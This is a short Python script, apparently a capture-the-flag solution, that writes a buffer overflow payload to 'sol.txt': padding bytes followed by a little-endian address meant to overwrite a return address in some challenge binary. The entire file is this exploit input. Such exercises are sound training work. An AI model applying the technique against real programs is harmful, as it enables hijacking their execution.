result = 6 * [0x61] + [0x61, 0x14, 0x40, 0x00]
with open('sol.txt', 'wb') as f:
    f.write(bytearray(result))
